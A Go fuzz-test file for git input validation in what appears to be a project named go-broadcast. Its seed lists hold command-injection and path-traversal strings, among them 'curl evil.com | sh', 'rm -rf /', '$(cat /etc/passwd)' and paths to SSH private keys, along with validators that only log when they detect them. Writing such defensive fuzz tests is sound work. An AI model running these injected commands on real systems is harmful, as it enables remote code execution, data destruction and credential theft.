//go:build go1.18
// +build go1.18

package git

import (
	"strings"
	"testing"

	"github.com/mrz1836/go-broadcast/internal/fuzz"
)

func FuzzGitURLSafety(f *testing.F) {
	// Add seed corpus
	seeds := []string{
		// Valid URLs
		"https://github.com/org/repo.git",
		"git@github.com:org/repo.git",
		"git://github.com/org/repo.git",
		"ssh://git@github.com/org/repo.git",
		"https://user:pass@github.com/org/repo.git",
		"https://github.com/org/repo",

		// Command injection attempts
		"https://github.com/org/repo.git; rm -rf /",
		"https://github.com/org/repo.git && curl evil.com | sh",
		"https://github.com/org/repo.git`whoami`",
		"https://github.com/org/repo.git$(cat /etc/passwd)",
		"https://github.com/org/repo.git|tee /tmp/pwned",
		"https://github.com/org/repo.git > /dev/null",
		"https://github.com/org/repo.git < /etc/passwd",
		"git@github.com:org/repo.git; echo pwned",

		// Path traversal attempts
		"file:///etc/passwd",
		"file://../../etc/passwd",
		"../../../etc/passwd",
		"https://github.com/../../../../etc/passwd",
		"..\\..\\windows\\system32",
		"~/.ssh/id_rsa",
		"$HOME/.ssh/config",

		// Special characters and encoding
		"https://github.com/org/repo.git#$(whoami)",
		"https://github.com/org/repo.git?cmd=exec",
		"https://github.com/org/repo\x00.git",
		"https://github.com/org/repo\n.git",
		"https://github.com/org/repo\r\n.git",
		"https://github.com/org/repo with spaces.git",
		"https://github.com/org/repo'test'.git",
		"https://github.com/org/repo\"test\".git",

		// Unicode and internationalization
		"https://github.com/🎉/🎉.git",
		"https://github.com/org/répo.git",

		// IPv6 and special hosts
		"git://[::1]/repo.git",
		"git://[2001:db8::1]/repo.git",
		"git://localhost/repo.git",
		"git://127.0.0.1/repo.git",

		// Edge cases
		strings.Repeat("https://github.com/org/", 100) + "repo.git",
		"",
		" ",
		"\t",
		"://",
		"git@",
		"https://",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, url string) {
		// Skip extremely long inputs
		if len(url) > 2048 { // Reasonable URL length limit
			t.Skip("URL too long")
		}

		defer func() {
			if r := recover(); r != nil {
				t.Fatalf("Panic with URL: %v, input: %q", r, url)
			}
		}()

		// Validate URL for security issues
		validateGitURL(t, url)

		// In real implementation, this would test against actual git client
		// Here we focus on validating the input patterns
	})
}

func FuzzGitFilePath(f *testing.F) {
	// Add seed corpus
	seeds := []string{
		// Valid file paths
		"README.md",
		"src/main.go",
		"docs/guide.md",
		"file.txt",
		".",
		"dir/",
		"dir/subdir/file.txt",

		// Path traversal attempts
		"../../../etc/passwd",
		"..\\..\\windows\\system32\\config",
		"../../../../etc/shadow",
		"..",
		"...",
		"./../../secret",
		"~/.ssh/id_rsa",
		"$HOME/.bashrc",
		"%USERPROFILE%\\secrets",

		// Command injection attempts
		"file;rm -rf /.txt",
		"file && curl evil.com | sh",
		"file`whoami`.txt",
		"file$(cat /etc/passwd).txt",
		"file|tee /tmp/pwned.txt",
		"file > /dev/null",
		"file < /etc/passwd",

		// Special characters
		"file with spaces.txt",
		"file\x00.txt",
		"file\n.txt",
		"file\r\n.txt",
		"file\t.txt",
		"file'test'.txt",
		"file\"test\".txt",
		"file\\test.txt",

		// Git special paths
		".git/config",
		".git/hooks/pre-commit",
		".gitignore",
		".gitmodules",

		// Unicode paths
		"file🎉.txt",
		"café.txt",

		// Special file names
		"",
		" ",
		"\t",
		"-",
		"--",
		"-rf",
		"*",
		"*.txt",
		"file|command.txt",
		"file>.txt",
		"file<.txt",
		"file&.txt",

		// Very long paths
		strings.Repeat("a/", 100) + "file.txt",
		strings.Repeat("a", 255) + ".txt",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, filePath string) {
		// Skip extremely long inputs
		if len(filePath) > 4096 { // PATH_MAX on most systems
			t.Skip("Path too long")
		}

		defer func() {
			if r := recover(); r != nil {
				t.Fatalf("Panic with file path: %v, input: %q", r, filePath)
			}
		}()

		// Validate file path for security issues
		validateGitFilePath(t, filePath)
	})
}

func FuzzGitBranchName(f *testing.F) {
	// Add seed corpus
	seeds := []string{
		// Valid branch names
		"master",
		"develop",
		"feature/test",
		"feature/test-123",
		"release/v1.0.0",
		"hotfix/urgent-fix",
		"user/name/feature",

		// Command injection attempts
		"main; rm -rf /",
		"feat`whoami`",
		"feat$(cat /etc/passwd)",
		"branch && curl evil.com | sh",
		"branch|tee /tmp/pwn",
		"branch > /dev/null",
		"branch < /etc/passwd",

		// Git special characters
		"branch~1",
		"branch^",
		"branch:test",
		"branch..other",
		"branch...other",
		"branch@{upstream}",
		"branch@{-1}",
		"branch.lock",

		// Leading dashes (could be flags)
		"-branch",
		"--branch",
		"-rf",
		"--force",
		"--help",
		"-",

		// Path traversal in branch names
		"../../../etc/passwd",
		"refs/../heads/main",
		"heads/../../config",

		// Special characters and whitespace
		"",
		" ",
		"\t",
		"\n",
		"branch with spaces",
		"branch\x00null",
		"branch\r\n",
		"branch'quote'",
		"branch\"doublequote\"",
		"branch\\backslash",

		// Unicode
		"feature/🎉",
		"brançh", // Accented

		// Git refs format
		"refs/heads/main",
		"refs/tags/v1.0",
		"refs/remotes/origin/main",
		"HEAD",
		"@",

		// Special Git names
		"HEAD~1",
		"ORIG_HEAD",
		"FETCH_HEAD",
		"MERGE_HEAD",

		// Edge cases
		strings.Repeat("a", 255),       // max branch length
		strings.Repeat("a/", 50) + "b", // many slashes
		".",
		"..",
		"*",
		"[branch]",
		"{branch}",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, branch string) {
		// Skip extremely long inputs
		if len(branch) > 255 { // Git branch name limit
			t.Skip("Branch name too long")
		}

		defer func() {
			if r := recover(); r != nil {
				t.Fatalf("Panic with branch name: %v, input: %q", r, branch)
			}
		}()

		// Validate branch name for security issues
		validateGitBranchName(t, branch)
	})
}

func FuzzGitCommitMessage(f *testing.F) {
	// Add seed corpus
	seeds := []string{
		// Normal commit messages
		"Initial commit",
		"Fix bug in authentication",
		"Add new feature: user profiles",
		"Update dependencies",
		"Refactor database layer",

		// Command injection attempts
		"Fixed bug; rm -rf /",
		"Update`whoami`",
		"Fix $(cat /etc/passwd)",
		"Feature && curl evil.com | sh",
		"Bug fix | tee /tmp/pwned",
		"Update > /dev/null",
		"Fix < /etc/passwd",

		// Multi-line messages
		"First line\nSecond line",
		"Title\n\nDetailed description",
		"Fix: bug\r\nDetails: fixed null pointer",

		// Special characters
		"Fix \"bug\" in 'code'",
		"Update\\backslash",
		"Feature\x00null",
		"Bug\tfix",
		"",
		" ",
		"\n",
		"\t",

		// Unicode and emoji
		"🎉 Initial commit",
		"Fix: résumé parsing",
		"✨ Add sparkles",

		// Very long messages
		strings.Repeat("a", 1000),
		strings.Repeat("Fix bug. ", 100),

		// Special Git conventions
		"Merge branch 'feature'",
		"Revert \"Previous commit\"",
		"fixup! Original commit",
		"squash! Another commit",

		// Potential injection via substitution
		"Fix $USER bug",
		"Update ${HOME} path",
		"Fix %PATH% issue",
		"Update ~/ handling",

		// URL-like content
		"Visit https://evil.com/script.sh",
		"See file:///etc/passwd",
		"Check git://internal/repo",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, message string) {
		// Skip extremely long inputs
		if len(message) > 100000 { // Reasonable commit message limit
			t.Skip("Commit message too long")
		}

		defer func() {
			if r := recover(); r != nil {
				t.Fatalf("Panic with commit message: %v, input: %q", r, message)
			}
		}()

		// Validate commit message
		validateGitCommitMessage(t, message)
	})
}

func FuzzGitRepoPath(f *testing.F) {
	// Add seed corpus
	seeds := []string{
		// Valid paths
		"/tmp/repo",
		"/home/user/projects/myrepo",
		"./repo",
		"../repo",
		"repo",
		"/var/lib/repos/test",

		// Path traversal attempts
		"../../../etc/passwd",
		"/etc/passwd",
		"../../root",
		"/root/.ssh",
		"~/.ssh/config",
		"$HOME/.bashrc",
		"%USERPROFILE%\\secrets",

		// Command injection attempts
		"/tmp/repo; rm -rf /",
		"/tmp/repo && curl evil.com",
		"/tmp/repo`whoami`",
		"/tmp/repo$(cat /etc/passwd)",

		// Paths with special characters
		"/tmp/repo with spaces",
		"/tmp/repo\x00null",
		"/tmp/repo\n",
		"/tmp/repo'quote'",
		"/tmp/repo\"doublequote\"",

		// Unicode paths
		"/tmp/répo",

		// Special cases
		"",
		" ",
		"\t",
		".",
		"..",
		"/",
		"//",
		"///multiple/slashes",

		// Very long paths
		"/" + strings.Repeat("a", 200) + "/repo",
		strings.Repeat("../", 50) + "repo",

		// Windows-style paths (might be used on Windows)
		"C:\\repos\\test",
		"\\\\server\\share\\repo",
		"..\\..\\repo",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, repoPath string) {
		// Skip extremely long inputs
		if len(repoPath) > 4096 { // PATH_MAX
			t.Skip("Path too long")
		}

		defer func() {
			if r := recover(); r != nil {
				t.Fatalf("Panic with repo path: %v, input: %q", r, repoPath)
			}
		}()

		// Validate repo path for security issues
		validateGitRepoPath(t, repoPath)
	})
}

// Validation helper functions

func validateGitURL(t *testing.T, url string) {
	// Check for command injection
	if fuzz.ContainsShellMetachars(url) {
		t.Logf("Security: Shell metacharacters in git URL: %q", url)
	}

	// Check for path traversal in file URLs
	if strings.HasPrefix(strings.ToLower(url), "file://") {
		if fuzz.ContainsPathTraversal(url) {
			t.Logf("Security: Path traversal in file URL: %q", url)
		}
	}

	// Check for null bytes
	if fuzz.ContainsNullByte(url) {
		t.Logf("Security: Null byte in URL: %q", url)
	}
}

func validateGitFilePath(t *testing.T, filePath string) {
	// Check for path traversal
	if fuzz.ContainsPathTraversal(filePath) {
		t.Logf("Security: Path traversal in file path: %q", filePath)
	}

	// Check for command injection (warning only for file paths)
	if fuzz.ContainsShellMetachars(filePath) {
		t.Logf("Security: Special characters in file path: %q", filePath)
	}

	// Check for null bytes
	if fuzz.ContainsNullByte(filePath) {
		t.Logf("Security: Null byte in file path: %q", filePath)
	}

	// Check if it starts with dash (could be interpreted as flag)
	if strings.HasPrefix(filePath, "-") && filePath != "-" && filePath != "." {
		t.Logf("Security: File path starts with dash: %q", filePath)
	}
}

func validateGitBranchName(t *testing.T, branch string) {
	// Check for command injection
	if fuzz.ContainsShellMetachars(branch) {
		t.Logf("Security: Shell metacharacters in branch name: %q", branch)
	}

	// Check for null bytes
	if fuzz.ContainsNullByte(branch) {
		t.Logf("Security: Null byte in branch name: %q", branch)
	}

	// Check if branch name starts with dash
	if strings.HasPrefix(branch, "-") {
		t.Logf("Security: Branch name starts with dash (could be interpreted as flag): %q", branch)
	}

	// Check for path traversal
	if strings.Contains(branch, "..") {
		t.Logf("Security: Potential path traversal in branch name: %q", branch)
	}
}

func validateGitCommitMessage(t *testing.T, message string) {
	// Git commit messages can legitimately contain special characters
	// Only check for null bytes which are problematic
	if fuzz.ContainsNullByte(message) {
		t.Logf("Security: Null byte in commit message: %q", message)
	}

	// Log if there are shell metacharacters (informational)
	if fuzz.ContainsShellMetachars(message) {
		t.Logf("Info: Special characters in commit message: %q", message)
	}
}

func validateGitRepoPath(t *testing.T, repoPath string) {
	// Check for command injection
	if fuzz.ContainsShellMetachars(repoPath) {
		t.Logf("Security: Shell metacharacters in repo path: %q", repoPath)
	}

	// Check for null bytes
	if fuzz.ContainsNullByte(repoPath) {
		t.Logf("Security: Null byte in repo path: %q", repoPath)
	}

	// Check for suspicious path patterns
	if strings.Contains(repoPath, "..") {
		t.Logf("Security: Potential path traversal in repo path: %q", repoPath)
	}

	// Check if path might escape intended directory
	suspiciousPaths := []string{"/etc", "/root", "/sys", "/proc"}
	for _, suspicious := range suspiciousPaths {
		if strings.HasPrefix(repoPath, suspicious) {
			t.Logf("Security: Suspicious system path: %q", repoPath)
		}
	}
}

// Test to verify validation logic
func TestGitCommandValidation(t *testing.T) {
	// This test verifies that our validation functions properly identify security patterns
	tests := []struct {
		name           string
		input          string
		checkFunc      func(*testing.T, string)
		expectSecurity bool // expect security issue to be logged
	}{
		{
			name:           "clean URL",
			input:          "https://github.com/org/repo.git",
			checkFunc:      validateGitURL,
			expectSecurity: false,
		},
		{
			name:           "URL with semicolon",
			input:          "https://github.com/org/repo.git; rm -rf /",
			checkFunc:      validateGitURL,
			expectSecurity: true,
		},
		{
			name:           "branch with dash",
			input:          "-branch",
			checkFunc:      validateGitBranchName,
			expectSecurity: true,
		},
		{
			name:           "path traversal",
			input:          "../../../etc/passwd",
			checkFunc:      validateGitFilePath,
			expectSecurity: true,
		},
		{
			name:           "clean branch",
			input:          "feature/test",
			checkFunc:      validateGitBranchName,
			expectSecurity: false,
		},
		{
			name:           "clean file path",
			input:          "README.md",
			checkFunc:      validateGitFilePath,
			expectSecurity: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Run validation and verify it doesn't panic
			tt.checkFunc(t, tt.input)
			// In real fuzzing, we would analyze logs for security patterns
		})
	}
}
